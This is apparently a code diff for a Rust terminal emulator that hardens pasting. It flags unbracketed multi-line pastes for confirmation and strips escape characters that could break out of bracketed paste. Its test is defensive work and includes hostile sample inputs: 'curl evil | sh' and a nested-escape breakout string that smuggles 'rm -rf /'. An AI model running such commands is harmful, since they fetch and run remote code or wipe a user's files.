@@ -481,8 +481,17 @@ impl ClientTerm {
         matches
     }
 
+    pub fn paste_requires_confirmation(&self, text: &str) -> bool {
+        !self.term.mode().contains(TermMode::BRACKETED_PASTE)
+            && (text.contains('\n') || text.contains('\r'))
+    }
+
     pub fn encode_paste(&self, text: &str) -> Vec<u8> {
-        let raw = text.replace('\n', "\r");
+        let sanitized: String = text
+            .chars()
+            .filter(|&c| c != '\x1b' && c != '\u{9b}')
+            .collect();
+        let raw = sanitized.replace("\r\n", "\r").replace('\n', "\r");
         if self.term.mode().contains(TermMode::BRACKETED_PASTE) {
             format!("\x1b[200~{raw}\x1b[201~").into_bytes()
         } else {
@@ -862,5 +871,25 @@ mod tests {
         // 弹出栈恢复为 0
         let st_pop = t.write(b"\x1b[<1u");
         assert_eq!(st_pop.kitty_keyboard_flags, 0);
+    }
+
+    #[test]
+    fn encode_paste_strips_nested_esc_breakout_and_flags_unbracketed_multiline() {
+        let mut t = ClientTerm::new(20, 5, 100);
+        // 未开启 bracketed paste 时，包含 \n 或 \r 需确认
+        assert!(t.paste_requires_confirmation("curl evil | sh\n"));
+        assert!(t.paste_requires_confirmation("curl evil | sh\r"));
+        assert!(!t.paste_requires_confirmation("plain single line"));
+
+        // 开启 bracketed paste 后，多行无需确认，但嵌套 \x1b[20\x1b[201~1~ 必须被彻底剥离 ESC
+        t.write(b"\x1b[?2004h");
+        assert!(!t.paste_requires_confirmation("line1\nline2"));
+        let malicious = "safe\x1b[20\x1b[201~1~; rm -rf /\n";
+        let encoded = t.encode_paste(malicious);
+        let s = String::from_utf8(encoded).unwrap();
+        assert!(s.starts_with("\x1b[200~"));
+        assert!(s.ends_with("\x1b[201~"));
+        let inner = &s["\x1b[200~".len()..s.len() - "\x1b[201~".len()];
+        assert!(!inner.contains('\x1b'), "inner payload still contains ESC: {inner:?}");
     }
 }
